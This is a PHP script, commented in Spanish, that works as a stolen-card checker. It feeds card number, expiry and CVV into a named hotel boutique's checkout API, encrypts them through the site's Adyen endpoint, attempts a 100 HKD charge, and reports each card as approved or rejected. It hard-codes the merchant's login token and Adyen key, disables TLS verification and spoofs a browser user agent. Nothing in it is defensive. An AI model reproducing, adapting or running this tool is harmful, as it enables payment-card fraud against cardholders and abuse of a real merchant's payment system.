<?php
ignore_user_abort(true);
error_reporting(0);
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: Content-Type');

// Función para manejar errores y enviar respuesta JSON
function sendResponse($status, $message, $data = []) {
    http_response_code($status == 'error' ? 500 : 200);
    echo json_encode([
        'success' => $status == 'success',
        'status' => $status,
        'message' => $message,
        'data' => $data,
        'timestamp' => date('Y-m-d H:i:s')
    ]);
    exit();
}

// Verificar si se recibió la lista
if (!isset($_GET['lista']) || empty($_GET['lista'])) {
    sendResponse('error', 'No se proporcionó la lista de tarjetas');
}

$lista = $_GET['lista'];
$parts = explode("|", $lista);

// Validar formato
if (count($parts) < 4) {
    sendResponse('error', 'Formato incorrecto. Use: NUMERO|MES|AÑO|CVV');
}

$cc = trim($parts[0]);
$mes = trim($parts[1]);
$ano = trim($parts[2]);
$cvv = trim($parts[3]);

// Validar datos básicos
if (!preg_match('/^\d{13,19}$/', $cc)) {
    sendResponse('error', 'Número de tarjeta inválido');
}

if (!preg_match('/^(0?[1-9]|1[0-2])$/', $mes)) {
    sendResponse('error', 'Mes inválido');
}

if (!preg_match('/^\d{2,4}$/', $ano)) {
    sendResponse('error', 'Año inválido');
}

if (!preg_match('/^\d{3,4}$/', $cvv)) {
    sendResponse('error', 'CVV inválido');
}

// Formatear mes y año
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

// Configuración básica
$api_endpoint = "https://boutique.shangri-la.com/sleb_api/api";
$site_login_token = "beQDmTL1oVRPZmOLWQdnFXCtRC4Eu5M81h3KtAiWIM0VMTki7RXw9RPrFlXLhoP42a5YNETYAcPVdmv8";

// Función para hacer peticiones CURL con manejo de errores
function makeCurlRequest($url, $data) {
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/json',
            'Accept: application/json'
        ],
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($data),
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3
    ]);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($response === false) {
        return [
            'success' => false,
            'error' => "CURL Error: $error",
            'http_code' => $http_code
        ];
    }
    
    $decoded = json_decode($response, true);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        return [
            'success' => false,
            'error' => 'Invalid JSON response',
            'raw_response' => substr($response, 0, 200)
        ];
    }
    
    return [
        'success' => true,
        'data' => $decoded,
        'http_code' => $http_code,
        'raw_response' => $response
    ];
}

// 1. Crear orden
$init_data = [
    "client_id" => "14",
    "promotion_id" => "1",
    "lang" => "en",
    "site_login_token" => $site_login_token,
    "hotel_code" => "ISL",
    "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
    "order_amount" => 100,
    "payment_method" => "adyen"
];

$init_result = makeCurlRequest($api_endpoint . "/checkout_init.php", $init_data);

if (!$init_result['success']) {
    sendResponse('error', 'Error al crear orden: ' . $init_result['error'], [
        'step' => 'checkout_init',
        'card' => substr($cc, -4)
    ]);
}

if (!isset($init_result['data']['order_number']) || !isset($init_result['data']['order_token'])) {
    sendResponse('rejected', 'No se pudo crear orden', [
        'step' => 'checkout_init',
        'response' => $init_result['data'],
        'card' => substr($cc, -4)
    ]);
}

$order_number = $init_result['data']['order_number'];
$order_token = $init_result['data']['order_token'];

// 2. Encriptar datos de tarjeta
$encrypt_data = [
    "client_id" => "14",
    "promotion_id" => "1",
    "lang" => "en",
    "site_login_token" => $site_login_token,
    "order_number" => $order_number,
    "order_token" => $order_token,
    "card" => $cc,
    "month" => $mes,
    "year" => $ano,
    "cvv" => $cvv,
    "adyen_key" => "10001|EA9DDE733BC69B0DF0AA6AAB6CAC1A8EE7D2D5BA830C670D2EABF9133B098A88BE1F8ABBDD999BA3A5B36465941FE09D95A4A9A1A53C815583DA1932C926B5C8F4023A183CEF755DE196D2FA9474F97DB47B4647A45D35AB9198EC492006C999680E0592005F1C1400B041ECE0282FF58BCD66DFA4B98CC262E0A450DD623FB57A4F2C05A624958F02F4D764FAE903362EC07457A970F9F64512AA8DC6008CEC94C1A675F6432BC1070BCB311462FB52EC23B3FE568A7D7B154506C91544671A43729520C448698CF590A6682F2BB4BDC95B9267361266A57EC68EC0830AD6ECDCC3447C049578787601685B98926471BE6F5BF1E8A1E97FD13009844A0B82E7",
    "adyen_version" => "_0_1_25"
];

$encrypt_result = makeCurlRequest($api_endpoint . "/adyen_encrypt.php", $encrypt_data);

if (!$encrypt_result['success']) {
    sendResponse('error', 'Error al encriptar datos: ' . $encrypt_result['error'], [
        'step' => 'adyen_encrypt',
        'card' => substr($cc, -4)
    ]);
}

if (!isset($encrypt_result['data']['encryptedCardNumber'])) {
    sendResponse('rejected', 'Error en encriptación de tarjeta', [
        'step' => 'adyen_encrypt',
        'response' => $encrypt_result['data'],
        'card' => substr($cc, -4)
    ]);
}

$encryptedCardNumber = $encrypt_result['data']['encryptedCardNumber'];
$encryptedExpiryMonth = $encrypt_result['data']['encryptedExpiryMonth'];
$encryptedExpiryYear = $encrypt_result['data']['encryptedExpiryYear'];
$encryptedSecurityCode = $encrypt_result['data']['encryptedSecurityCode'];

// 3. Procesar pago
$process_data = [
    "client_id" => "14",
    "promotion_id" => "1",
    "lang" => "en",
    "site_login_token" => $site_login_token,
    "order_number" => $order_number,
    "order_token" => $order_token,
    "hotel_code" => "ISL",
    "encryptedCardNumber" => $encryptedCardNumber,
    "encryptedExpiryMonth" => $encryptedExpiryMonth,
    "encryptedExpiryYear" => $encryptedExpiryYear,
    "encryptedSecurityCode" => $encryptedSecurityCode,
    "amount" => ["value" => 100, "currency" => "HKD"],
    "return_url" => "https://boutique.shangri-la.com/adyen_card_redirect.php",
    "payment_method" => "adyen",
    "card_type" => "Visa"
];

$process_result = makeCurlRequest($api_endpoint . "/adyen_process.php", $process_data);

if (!$process_result['success']) {
    sendResponse('error', 'Error al procesar pago: ' . $process_result['error'], [
        'step' => 'adyen_process',
        'card' => substr($cc, -4)
    ]);
}

// Verificar resultado
if (isset($process_result['data']['resultCode']) && $process_result['data']['resultCode'] == 'Authorised') {
    sendResponse('success', 'Tarjeta APROBADA', [
        'card' => substr($cc, -4),
        'bin' => substr($cc, 0, 6),
        'expiry' => $mes . '/' . substr($ano, -2),
        'result' => 'Authorised',
        'gateway' => 'Adyen',
        'amount' => '100 HKD',
        'order_number' => $order_number,
        'full_response' => $process_result['data']
    ]);
} else {
    $reason = isset($process_result['data']['refusalReason']) 
        ? $process_result['data']['refusalReason'] 
        : (isset($process_result['data']['resultCode']) 
            ? $process_result['data']['resultCode'] 
            : 'Desconocido');
    
    sendResponse('rejected', 'Tarjeta RECHAZADA: ' . $reason, [
        'card' => substr($cc, -4),
        'reason' => $reason,
        'gateway' => 'Adyen',
        'response' => $process_result['data']
    ]);
}
?>